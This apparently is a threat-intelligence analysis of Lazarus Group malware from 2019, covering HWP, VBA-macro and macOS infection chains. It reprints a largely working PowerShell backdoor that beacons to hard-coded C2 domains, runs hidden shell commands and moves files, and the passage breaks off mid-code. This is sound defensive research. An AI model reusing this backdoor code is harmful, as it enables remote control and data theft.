# A Look into the Lazarus Group's Operations in October 2019
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#Original-Tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [External analysis](#Analysis)

## Malware analysis <a name="Malware-analysis"></a>
###### The next analysis try to kept the recents events and a logicial improvement and technics of the group, this can go back in the past for compare it.
### CES 2020 incident (NukeSped)
###### We can see that the document target specifily the south korean exhibitors with the follow tittle "Application form for American Las Vegas CES 2020"
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/Doc.PNG)
###### This initial vector of the infection begin by a current exploit in HWP (CVE-2015-6585) to execute an EPS script, this download and execute the next stage of the infection.
![alt text](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/EPS.PNG)
###### This execute fisrtly a common trick RtlCaptureContext for have ability to register a top-level exception handler and avoid debbuging.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_anti-debug.png)
###### Once this done, the malware execute a series of actions like list the disks, process, files and push it in differents files as temp file in waiting to send the data to C2.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_sysinfo.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_disks.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_finfFile.png)
###### The RAT push the cookie settings and guid for the identification in the C2.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_pushguid.png)
###### This push the list of C2 address to contact, the languages to understand and begin the contact with the C2 in giving the host info. 
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_address.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_Options.png)
###### List of the languages used :
|RFC4646/ISO 639 Ref|Lang|
|:-------------:|:-------------:|
|Az-Arab|Azerbaijani in Arabic script|
|de-CH|Swiss German|
|en-US|English as used in the United States|
###### Interesting to see that not only south korea language is choisen and show that the group target all exhibitors (more a hundred exhibitors only for South Korea). This think possibly that the group manage the event give hardware specifily for the shows to the customers, that explains why this to don't include specific language like South Korea. If the target is interesting for the group, this  can execute command and others tools in the computer infected.

###### We can see in the list of all the domains used that this all as different cloud providers and are legit website hijacked by vulnerable wordpress.
|IP|ASN|Organization|Route|City|Coordinates|Country|
|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|
|64.151.229.52|AS26753|In2net Network Inc.|64.151.192.0/18|Toronto|43.6861,-79.4025|Canada|
|185.136.207.217|AS203377|LAB internet ve Bilisim Hizmetleri|185.136.207.0/24|Eskiehir|39.7767,30.5206|Turkey|
|83.169.17.240|AS8972|Europe GmbH|83.169.16.0/21|Köln|50.9541,6.9103|Germany|
###### We can confirmed it by the Whois records and by the certificats push on the websites know at all the sites have between up early August 2019 at September 2019.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/HWP-cert.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/HWP-whois.png)
### HAL incident (JakyllHyde)
###### The document specifically target the Hindustan Aeronautics Limited company (HAL) that the national aeronautics in India. This use false announcements for recruitment for target probably interesting profile or internal employees in asking for their opinion about announcements.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_cover.png)
###### The attack vector is an maldoc which use a macro for drop and execute the implant. The first bloc is a declaration of function for load the future extracted dll.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_1.png)
###### The next bloc have multiple functions like decode from the base 64 in binary and string, verify the path of folder/file, create a folder and extract the correct payload from the form in maldoc according to the OS.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_2.png)
###### The following bloc have extraction functions (drop the lure) and for get the name of the lure and the dll.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_3.png)
###### We can see the autoopen function for execute the macro at the opening of the document and the data of the malware in base 64.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_4.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_5.png)
###### The backdoor begins to do the reconnaissance actions like list the process,system informations(Username, ComputerName ...)   
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_process.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_systeminfos.png)
###### After this list all the disks on the computer and all the files in current working directories in waiting the order of the C2.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_disk.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_getinfos.png)
###### This have the possibility to intercepts keystrokes (push it in temporary file), make screenshots, send interesting files by stream of bytes data.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_keyboard.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_getscreenshot.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_getimage.png)
###### If the attacker wants this can push and remove the persistence performed by a Startup key.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_writeKey.PNG)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_pushpersistence.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_deletekey.png)
###### The backdoor contact the following IP :
|IP|ASN|Organization|Route|City|Coordinates|Country|
|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|
|193.70.64.163|AS16276|thetiscloud.it|193.70.0.0/17| San Donato Milanese|45.4105,9.2684|Italy|
###### By the certificates, we can see that the website is up since 2018, seems be a legit website hijacked.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/MAL-Cert.png)
###### Like the last incident, Lazarus group try to get high technologies, this possible that the interest is the fact that HAL is in cooperation for product and use the new french militairy aircraft (Rafale) in the India country.

### OSX Malwares (OSX.Yort)
###### The initial vector of the infection is a maldoc with a VBA macro, this have two sections one for infected MacOSX and one for Windows. We can see the declaration of the functions for MacOSX and one of four splitted functions for get the payload on the Windows version 
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Maldoc-VBA-1.PNG)
###### Here, we can observe the initiation of the payloads according with the OS in the AutoOpen (Run a macro when Excel or Word document is open).
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Maldoc-VBA-2.PNG)
###### The backdoor consists of a single loop which load the configuration and create a session for waiting the orders of the C2. The configuration can be update and the malware can be sleep for a delay given by the C2.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-main.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-mainloop.png)
###### Many functions for send and get data are derived of a common based code with a specific action as perform at the final.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/functionscom.PNG)
###### Foreach, this initiate and push the paramerters for communicate with the C2.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-weboptions.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_option.png)
###### This can reply to the C2 like a pulse for alert at is still up (ReplyDie), download a file (ReplyDown), download and execute a file (ReplyExec), execute a command (Replycmd) or open another CLI (ReplyOtherShellCmd).
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-replydie.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-ReplyDown.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-ReplyExec.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-Replycmd.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-ReplyOtherShellCmd.png)
###### We can see on the data pushed on the C2 that a xor is performed with the ```"0xAA"``` value.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-Pushdata.png)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-xor.png)
###### The malware don't have a persistence but by the fact that can execute command, the attacker can decide push a persistence if this neccessary, a function is performed when the attack close the session for return that the backdoor is correctly closed.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-destroysession.png)
###### This according with the Kaspersky analysis of Yort on the functions of the backdoor:
+ ###### Set sleep time (delay between C2 interactions)
+ ###### Exit session
+ ###### Collect basic host information
+ ###### Check malware status
+ ###### Show current malware configuration
+ ###### Update malware configuration
+ ###### Execute system shell command
+ ###### Download & Upload files

###### Another sample of Yort have been spotted with a reedited installer of Flash Player, on the strings, we can observed that is the version 10.2 that is rebuilded.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_version.PNG)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_version2.PNG)
###### We can see in the main function that install the legit Flash player, the checker software for update for avoid to become suspicious to the user and launch the backdoor.
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_entry.png)
###### This loading the configuration and options of the Yort, the rest is the same that the previous sample of Yort. 
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_Command.PNG)
![alt text](https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_option.png)
### Powershell Backdoor (PowerShell/NukeSped)
###### Now, see the Windows version, this use Powershell language for the backdoor 

``` powershell
$global:breakvalue=1
$global:mbz=132608
$global:tid=0
$global:url="https://crabbedly.club/board.php","https://craypot.live/board.php","https://indagator.club/board.php"
$global:nup=0
$global:nwct=0

function CopyBytes($DatatoCopy,$dst,$dstOffset)
{
	$Bytes=[System.BitConverter]::GetBytes($DatatoCopy)
	return [System.Buffer]::BlockCopy($Bytes,0,$dst,$dstOffset,$Bytes.length)
}
function CopyBytes_UTF8($DatatoCopy,$dst,$dstOffset)
{
	$Bytes=[System.Text.ASCIIEncoding]::UTF8.GetBytes($DatatoCopy)
	return [System.Buffer]::BlockCopy($Bytes,0,$dst,$dstOffset,$Bytes.length)
}
function ConverttoInt32($buffer,$Offset){ return [System.BitConverter]::ToInt32($buffer,$Offset) }
function Get_UTF8Bytes($Data){ return [System.Text.ASCIIEncoding]::UTF8.GetBytes($Data) }
function senddata($tid,$rid,$array_data,$DatatoC2_Length,$url)
{
	try
	{
		if($array_data -eq $null){$array_data=New-Object byte[] 0}
		$ID=-join((48..57)|Get-Random -Count 12|%{[char]$_}) #10 random numbers
		$filename=-join((48..57)|Get-Random -Count 12|%{[char]$_})+".dat" # LIKE 5216804379.dat by example
		$date_msg="--" + (Get-Date -Format yyyy-MM-dd-hh-mm-ss-fffffff) + "--"
		$netobject=[System.Net.WebRequest]::create($url + "?v=" + $ID)
		$netobject.Method="POST"
		$netobject.ContentType="multipart/form-data; boundary=$date_msg"
		$netobject.TimeOut=120000
		$netobject.ReadWriteTimeout=120000
		$netobject.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
		$pbdy=Get_UTF8Bytes("`r`n`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"_webident_f`"`r`n`r`n" + $tid + "`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"_webident_s`"`r`n`r`n" + $rid + "`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"file`"; filename=`"" + $filename + "`"`r`nContent-Type: octet-stream`r`n`r`n")
		$ebdy=Get_UTF8Bytes("`r`n--" + $date_msg + "`r`n")
		$netobject.ContentLength=$pbdy.Length + $DatatoC2_Length + $ebdy.Length;
		$StreamObject=$netobject.GetRequestStream()
		$StreamObject.Write($pbdy,0,$pbdy.Length)
		$StreamObject.Flush()
		if($DatatoC2_Length -gt 0)
		{
			$StreamObject.Write($array_data,0,$DatatoC2_Length)
			$StreamObject.Flush()
		}
		$StreamObject.Write($ebdy,0,$ebdy.Length)
		$StreamObject.Flush()
		$StreamObject.Close()
		return $netobject
	}
	catch{return $null}
}
function PushDatatoC2($tid,$rid,$bd,$DatatoC2_Length,$url)
{
	if($DatatoC2_Length -gt 0){ for($i=0;$i -lt $DatatoC2_Length; $i++){$bd[$i]=$bd[$i] -bxor 0xAA} }
	return senddata $tid $rid $bd $DatatoC2_Length $url
}
function GetResponseC2($netobject,$mxz)
{
	try
	{
		$response=$netobject.GetResponse()
		if($response.StatusCode -eq "OK")
		{
			$stream=$response.GetResponseStream()
			$byteobject=New-Object byte[] $mxz
			$val=0
			$response_length=$byteobject.Length
			if($response_length -gt $response.ContentLength){$response_length=$response.ContentLength}
			while($val -lt $response_length)
			{
			$dataread=$stream.Read($byteobject,$val,$response_length-$val)
			if($dataread -le 0){break}
			$val=$val+$dataread
			}
			if($val -ne 0)
			{
				if($val -eq 1){$byteobject2=New-Object byte[] 2}
				else
				{
					$byteobject2=New-Object byte[] $val}
					[System.Buffer]::BlockCopy($byteobject,0,$byteobject2,0,$val)
			}
			else{$byteobject2=New-Object byte[] 2}
			$response.Close()
			$r.Close()
			$r.Dispose()
			return $byteobject2
		}
		else{return $null} 
	}
	catch{return $null}
}
function DecryptC2Data($netobject,$mxz)
{
	$DataC2=GetResponseC2 $netobject $mxz
	if($DataC2 -ne $null){for($i=0; $i -lt $DataC2.length; $i++){ $DataC2[$i] = $DataC2[$i] -bxor 0xAA }}
	return $DataC2
}
function updatemod1()
{
	$trigger=0
	do
	{
		$byteobject=New-Object byte[] 12
		CopyBytes 5 $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 0 $byteobject 8
		$response=PushDatatoC2 $global:tid 21 $byteobject $byteobject.Length $global:url[$global:nup]
		if($response -eq $null){break}
		$byteobject=DecryptC2Data $response $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -ne 2)){break}
		$trigger=1
	}while($false)
	return $trigger
}
function updatemod2()
{
	$trigger=0
	do
	{

		$byteobject=New-Object byte[] 16
		CopyBytes 4 $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 4 $byteobject 8
		CopyBytes 0 $byteobject 12
		$rq=PushDatatoC2 $global:tid 21 $byteobject $byteobject.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$byteobject=DecryptC2Data $rq $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -ne 2)){break}
		$trigger=1
	} while($false)
	return $trigger
}
function updatemod3($nmsg)
{
	$trigger=0
	do
	{

		$byteobject=New-Object byte[] 12
		CopyBytes $nmsg $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 0 $byteobject 8
		$rq=PushDatatoC2 $global:tid 20 $byteobject $byteobject.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$byteobject=DecryptC2Data $rq $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -lt 12)){break}
		$nmsg=ConverttoInt32 $byteobject 0
		$nmlen=ConverttoInt32 $byteobject 8
		if($byteobject.length -ne ($nmlen+12)){break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
		$trigger=1
	} while($false)
	return $trigger
}
function slp($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		if($nmlen -ne 4){break}
		$global:nwct=ConverttoInt32 $buf 12
		$trigger=updatemod1
		$trigger=0
	} while($false)
	return $trigger
}
function disconnect()
{
	$trigger=0
	do
	{
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
		$global:breakvalue=0
	} while($false)
	return $trigger
}
function Set-SysInfo()
{
	$trigger=0
	do
	{
		$hostnamename=$env:COMPUTERNAME
		$ip=(Test-Connection -ComputerName $hostname -Count 1  | Select -ExpandProperty IPV4Address).Address
		$OS=[System.Environment]::OSVersion.Version
		$OS_major=$OS.major
		$OS_minor=$OS.minor
		$byteobject=New-Object byte[] 300
		CopyBytes 11 $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 288 $byteobject 8
		CopyBytes_UTF8 $hostname $byteobject 12
		CopyBytes $ip $byteobject 272
		CopyBytes 1 $byteobject 276
		CopyBytes $OS_major $byteobject 280
		CopyBytes $OS_minor $byteobject 284
		CopyBytes 3 $byteobject 288
		CopyBytes 0 $byteobject 292
		CopyBytes 6 $byteobject 296
		$rq=PushDatatoC2 $global:tid 20 $byteobject $byteobject.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$byteobject=DecryptC2Data $rq $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -lt 12)){break}
		$nmsg=ConverttoInt32 $byteobject 0
		$nmlen=ConverttoInt32 $byteobject 8
		if($byteobject.length -ne ($nmlen+12)){break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
		$trigger=1
	} while($false)
	return $trigger
}
function kalv()
{
	$trigger=0
	do
	{
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
	} while($false)
	return $trigger
}
function Get-actions()
{
	$trigger=0
	do
	{
		$nmsg=14
		$nrsv=0
		$nmlen=2152
		$basefunctions=New-Object byte[] 2164
		CopyBytes $nmsg $basefunctions 0
		CopyBytes $nrsv $basefunctions 4
		CopyBytes $nmlen $basefunctions 8
		for($i=0;$i -lt $global:url.length;$i++){CopyBytes_UTF8 $global:url[$i] $basefunctions (84+260*$i)}
		$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$basefunctions=DecryptC2Data $rq $global:mbz
		if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
		$nmsg=ConverttoInt32 $basefunctions 0
		$nmlen=ConverttoInt32 $basefunctions 8
		if($basefunctions.length -ne ($nmlen+12)){break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
		$trigger=1
	} while($false)
	return $trigger
}
function Set-actions($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		if($nmlen -ne 2152){break}
		for($i=0;$i -lt $global:url.length;$i++)
		{
			$js=0
			for($js=0;$js -lt 260;$js++){if($buf[(84+260*$i)+$js] -eq 0){break}}
			$global:url[$i] = [System.Text.ASCIIEncoding]::UTF8.GetString($buf, (84+260*$i), $js)
		}
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
	} while($false)
	return $trigger
}
function Set-command($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$arg=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		$path=[System.IO.Path]::GetTempFileName()
		$process = New-Object System.Diagnostics.Process
		$pif = New-Object System.Diagnostics.ProcessStartInfo
		$pif.FileName="cmd.exe"
		$pif.CreateNoWindow=$true;
		$pif.WindowStyle="Hidden";
		$pif.Arguments="/c "+$arg+" >"+$path+" 2>&1"
		$process.StartInfo=$pif
		$process.Start() | Out-Null
		$srs=""
		$count=0
	while ($process.HasExited -eq $false)
	{
		if($count -gt 24){break}
		$count=$count+1
		Start-Sleep -s 1
	}
	if([System.IO.File]::Exists($path))
	{
		try
		{
            $content=Get-Content -Path $path; 
            Remove-Item -Path $path;
			if($content.GetType().FullName -eq "System.Object[]")
			{
				for($i=0;$i -lt $content.Length; $i++){$srs=$srs+$content[$i]+"`r`n"}
			}
			else{$srs=$content}
		}
		catch{$srs=""}
	}
	$srsb=Get_UTF8Bytes($srs)
	$trigger= updatemod3 5
	if($trigger -eq 0){break}
	$srsb=Get_UTF8Bytes($srs)
	$ncr=0
	$trigger=1
	while($ncr -lt $srsb.length)
	{
		$ncrs=1024*100
		if($ncrs -gt ($srsb.length-$ncr)){$ncrs=($srsb.length-$ncr)}
		$nmlen=$ncrs
		$basefunctions=New-Object byte[] (12+$ncrs)
		CopyBytes 16 $basefunctions 0
		CopyBytes 0 $basefunctions 4
		CopyBytes $nmlen $basefunctions 8
		for($i=0;$i -lt $ncrs;$i++){$basefunctions[12+$i]=$srsb[$ncr+$i]}
		$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
		if($rq -eq $null){$trigger=0;break}
		$basefunctions=DecryptC2Data $rq $global:mbz
		if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
		$nmsg=ConverttoInt32 $basefunctions 0
		$nmlen=ConverttoInt32 $basefunctions 8
		if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){$trigger=0;break}
		$ncr=$ncr+$ncrs
		}
		if($trigger -eq 0){break}
		$trigger=updatemod3 17
		if($trigger -eq 0){break}
		$trigger=1
	}while($false)
	return $trigger
}
function upload($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$path=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		$fs=$null
		try{$fs=[System.IO.File]::Open($path, [System.IO.FileMode]::Append)}catch{$fs=$null}
		if($fs -eq $null){$trigger=updatemod2;}
		else
		{
			try
			{
				$fl=[int]$fs.length
				$nmsg=5
				$nrsv=0
				$nmlen=4
				$basefunctions=New-Object byte[] 16
				CopyBytes $nmsg $basefunctions 0
				CopyBytes $nrsv $basefunctions 4
				CopyBytes $nmlen $basefunctions 8
				CopyBytes $fl $basefunctions 12
				$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
				if($rq -eq $null){break}
				$basefunctions=DecryptC2Data $rq $global:mbz
				if(($basefunctions -eq $null) -or ($basefunctions.length -lt 24)){break}
				$nmsg=ConverttoInt32 $basefunctions 0
				$nmlen=ConverttoInt32 $basefunctions 8
				$rfl=ConverttoInt32 $basefunctions 12
				if($basefunctions.length -ne ($nmlen+12)){break}
				if(($nmlen -ne 12) -or ($nmsg -ne 5)){break}
				$trigger=updatemod1
				if($trigger -eq 0){break}
				$bed=0
				while($true)
				{
					$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
					if($rq -eq $null){$trigger=0;break}
					$basefunctions=DecryptC2Data $rq $global:mbz
					if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
					$nmsg=ConverttoInt32 $basefunctions 0
					$nmlen=ConverttoInt32 $basefunctions 8
					if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
					$fs.Write($basefunctions,12,$nmlen)
					if($nmsg -eq 17){$bed=1}
					$trigger=updatemod1
					if($trigger -eq 0){break}
					if($bed -eq 1){break}
				}
				$fs.Close()
				if($trigger -eq 0){break}
			}
			catch{$fs.Close();break}
		}
		$trigger=1
	} while($false)
	return $trigger
}
function download($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$path=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		$fs=$null
		try{$fs=[System.IO.File]::OpenRead($path)}catch{$fs=$null}
		if($fs -eq $null){$trigger=updatemod2;}
	else
	{
		try
		{
			$fl=$fs.length
			$basefunctions=New-Object byte[] 24
			CopyBytes 5 $basefunctions 0
			CopyBytes 0 $basefunctions 4
			CopyBytes 12 $basefunctions 8
			CopyBytes $fl $basefunctions 12
			CopyBytes 0 $basefunctions 16
			CopyBytes 0 $basefunctions 20
			$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
			if($rq -eq $null){break}
			$basefunctions=DecryptC2Data $rq $global:mbz
			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 16)){break}
			$nmsg=ConverttoInt32 $basefunctions 0
			$nmlen=ConverttoInt32 $basefunctions 8
			$rfl=ConverttoInt32 $basefunctions 12
			if($basefunctions.length -ne ($nmlen+12)){break}
			if(($nmlen -ne 4) -or ($nmsg -ne 5)){break}
			$trigger=1
			if($rfl -gt $fl){$rfl=$fl}
			$fs.Seek($rfl, [System.IO.SeekOrigin]::Begin)
			while($true)
			{
				$ncrs=1024*100
				$tbf=New-Object byte[] $ncrs
				$nr=$fs.Read($tbf, 0, $tbf.Length)
				if($nr -eq 0){break}
				$nmsg=16
				$nrsv=0
				$nmlen=$nr
				$basefunctions=New-Object byte[] (12+$nr)
				CopyBytes $nmsg $basefunctions 0
				CopyBytes $nrsv $basefunctions 4
				CopyBytes $nmlen $basefunctions 8
				for($i=0;$i -lt $nr;$i++){$basefunctions[12+$i]=$tbf[$i]}
				$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
				if($rq -eq $null){$trigger=0;break}
				$basefunctions=DecryptC2Data $rq $global:mbz
				if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
				$nmsg=ConverttoInt32 $basefunctions 0
				$nmlen=ConverttoInt32 $basefunctions 8
				if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
				if(($nmlen -ne 0) -or ($nmsg -ne 5)){$trigger=0;break}
			}
			$fs.close()
			if($trigger -eq 0){break}
			$trigger=updatemod3 17
			if($trigger -eq 0){break}
		}
		catch{$fs.Close();break}
	}
	$trigger=1
	} while($false)
	return $trigger
}
function launch_process($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$arg=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		Start-Process $arg
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
	} while($false)
	return $trigger
}
function PulsetoC2($rid)
{
	$trigger=$false
	if($rid -eq 16){$global:nup=($global:nup + 1) % $global:url.Length}
	$rq=senddata $global:tid $rid $null 0 $global:url[$global:nup]
	if($rq -ne $null)
	{
		$basefunctions=GetResponseC2 $rq $global:mbz
		if(($basefunctions.length -eq 2) -and ($basefunctions[0] -eq 49)){$trigger=$true}
	}
	return $trigger
}
function command($url)
{
	try
	{
		while($global:breakvalue)
		{
			$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
			if($rq -eq $null){break}
			$basefunctions=DecryptC2Data $rq $global:mbz
